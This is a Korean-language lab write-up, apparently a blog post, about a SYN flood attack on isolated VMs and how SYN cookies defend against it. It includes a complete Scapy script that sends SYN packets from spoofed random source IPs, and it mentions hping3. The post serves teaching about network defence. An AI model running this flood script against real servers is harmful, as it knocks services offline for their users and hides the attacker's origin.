---
share: "true"
title: SYN Flood Attack
date: 2026-04-30
categories: network
tags:
  - network
  - DoS
filenames: 2026-04-30-obsidian-publish
---

# 사전준비


## VM 2대 준비

Hosy-Only로 묶임

### Attacker

![Pasted image 20260423191817.png](Pasted%20image%2020260423191817.png)

IP=192.168.1.71
Victim에 연결 확인됨








### Victim

![Pasted image 20260423191724.png](Pasted%20image%2020260423191724.png)

IP=192.168.1.73



### Victim apache2 서버

kali 기본기능
![Pasted image 20260423203326.png](Pasted%20image%2020260423203326.png)
victim에서 서버 열고

![Pasted image 20260423203335.png](Pasted%20image%2020260423203335.png)
attacker 접속 가능 확인

![Pasted image 20260425143216.png](Pasted%20image%2020260425143216.png)

syn_cookie 방어 off

![Pasted image 20260425143419.png](Pasted%20image%2020260425143419.png)

80번(HTTP) LISTEN 상태


# 공격

공격 코드
```python
#!/usr/bin/env python3
from scapy.all import *
import random
import sys

def syn_flood_attack(target_ip, target_port):
    print(f"start attack: {target_ip}:{target_port} (stop: Ctrl+C)")
    packet_count = 0
    try:
        while True:
            src_ip =  f'{str(random.randint(0,255))}.{str(random.randint(0,255))}.{str(random.randint(0,255))}.{str(random.randint(0,255))}'

            src_port =  random.randint(1024,65536)
            attack= IP(src=src_ip, dst=target_ip,len=65535)/TCP(sport=src_port,dport=target_port,window=512)
            send(attack,verbose=False)
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"현재 전송된 패킷 수: {packet_count}")
 
    except KeyboardInterrupt:
        print(f"\n {packet_count} packet sended")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 syn_flood.py <Target_IP> <Target_Port>")
        sys.exit(1)
   
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    syn_flood_attack(target_ip, target_port)
```

![Pasted image 20260425143814.png](Pasted%20image%2020260425143814.png)

Victim의 wireshark 상태
![Pasted image 20260425143744.png](Pasted%20image%2020260425143744.png)
![Pasted image 20260425143753.png](Pasted%20image%2020260425143753.png)
Source를 보면 알 수 있듯 출발지 IP가 전부 랜덤이다.


![Pasted image 20260425145246.png](Pasted%20image%2020260425145246.png)
Half-Open 상태 패킷들. SYN_RECV 상태로 계속 대기하고 있는 걸 볼 수 있다.


### 왜 SYN_RECV 상태로 대기하는가?

TCP/IP의 3-way handshake 과정은 다음과 같다.
![Pasted image 20260425185425.png](Pasted%20image%2020260425185425.png)

여기서, SYN을 받은 후 서버는 송신자 측에 SYN/ACK 패킷을 보내고 ACK 패킷을 받을 걸 기대한다.
그러나, SYN Flood attack의 경우 송신자의 IP 부분을 랜덤한 IP 주소로 바꿔 버리기 때문에, 아무리 SYN/ACK 패킷을 보낸다고 해도 ACK 패킷이 돌아오지 않는다.
그렇기 때문에 서버(여기서는 Victim)은 SYN_RECV 상태를 계속 유지하고 있게 되며 큐를 차지하고 있게 된다.




하지만 서버가 가벼워서인지 apache 페이지 자체에 대한 접속은 멀쩡히 가능했다.
![Pasted image 20260425150630.png](Pasted%20image%2020260425150630.png)

ping으로 지연을 확인해 보았을 때 또한 유의미한 차이가 보이지 않았다.

공격을 한 상태에서의 ping 결과


![Pasted image 20260425151134.png](Pasted%20image%2020260425151134.png)
공격 이전(SYN_RECV 상태 패킷이 없을 때)

![Pasted image 20260425153116.png](Pasted%20image%2020260425153116.png)
공격 도중

혹시나 패킷의 양이 부족한가 싶어 한번에 1000개의 패킷을 보내거나, 전용 툴인 hping3를 활용해 보았을 때도 결과는 차이가 없었다.

# SYN_Cookie 활성화 이후


사실 앞서 SYN_Cookie를 비활성화한 상태에서도 접속이 잘 되었다 보니 직접적인 체감은 힘들다.
그래도 일단 활성화 한 뒤 공격을 해 보았지만, 차이가 없었다.

![스크린샷 2026-04-23 203303.png](%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202026-04-23%20203303.png)
접속이 잘 되는 모습



그래서 조금 다른 방법이지만 victim을 metasploitable2로 바꿔서 syn_cookie에 대한 실험을 추가로 해 보았다.
다만 metasploitable2는 CLI 전용이라 wireshark 캡처는 못했고 tcpdump로 대체했다.

# 추가 실험


![Pasted image 20260425180752.png](Pasted%20image%2020260425180752.png)
Metasploitable2의 ip=192.168.40.129

![Pasted image 20260425180814.png](Pasted%20image%2020260425180814.png)![Pasted image 20260425180815.png](Pasted%20image%2020260425180815.png)

syn_cookies 끄고 8180포트 수신중
![Pasted image 20260425183450.png](Pasted%20image%2020260425183450.png)
공격 전 접속이 잘 되는 모습


## 공격 시도(1차)

위의 scapy 코드로 공격 시도를 해봤지만, 여전히 서버 접속이 잘 되었다.![Pasted image 20260425184234.png](Pasted%20image%2020260425184234.png)사진상 구분은 잘 안가지만 새로고침을 반복해 본 결과이다.


## 공격 시도(2차)

그래서 어쩔 수 없이, SYN_Cookie 작동 확인을 위해 hping3를 사용했다.
hping3를 사용하고 새로고침을 하자마자 로딩이 걸리더니, 결국 timeout이 발생해 공격이 잘 작동한 것을 볼 수 있다.
![Pasted image 20260425184650.png](Pasted%20image%2020260425184650.png)

### SYN_Cookie on

![Pasted image 20260425184715.png](Pasted%20image%2020260425184715.png)

활성화 후 공격시
![Pasted image 20260425184746.png](Pasted%20image%2020260425184746.png)

사진이라 체감하기 어렵지만, 속도가 상당히 느려졌기는 해도 접속 자체는 timeout 없이 잘 된다는 것을 볼 수 있다.




### SYN_Cookies가 SYN flood attack에서 보호하는 원리

SYN_Cookies가 활성화 되었을 때, 서버는 더 이상 SYN 패킷을 SYN Backlog(큐)에 보관하지 않는다. 
그 대신에 SYN 패킷에 있는 정보들을(클라이언트 IP, timestamp 등) 종합해서 syncookies를 만든다. 그리고 그 값을 SYN/ACK의 ISN(Inital Sequence Number)로 만들어서 클라이언트에 보낸다.
즉, 패킷 내용 기반으로 한 ISN 값을 구성해 보내게 된다. 만약 정상적인 클라이언트였다면 당연히 ACK를 보낸다. 그리고 이를 기반으로 정상적인 패킷이라는 것이 확인되면 Listen backlog로 넘겨 통신을 준비한다.

여기서 중요한 점은, SYN Cookies는 SYN flooding으로 인해서 "backlog가 가득 찼을 때만" 작동한다. backlog가 가득 찬 상황이 되었으니, SYN 패킷들을 바로바로 backlog로 보내지 않고 syncookie를 이용해 올바른 연결인지 판단을 하고 backlog로 넘겨주는 식이다. 
![Pasted image 20260425191242.png](Pasted%20image%2020260425191242.png)
![Pasted image 20260425191645.png](Pasted%20image%2020260425191645.png)
사진으로 보면 위와 같다.

그림에서 보이듯 수신자 측이 아닌 L4(방화벽)단, 즉 커널이나 하드웨어 단에서 이루어져 많은 양의 패킷이 와도 비교적 수월하게 처리할 수 있다는 점 또한 장점이다.

정리하자면, SYN Cookie는 backlog가 가득 찼을 때, syncookie를 생성해 송신자에게 보내고, 올바른 내용의 패킷을 경우 backlog로 보내는 방식으로 가용성을 보존하는 방식이다.


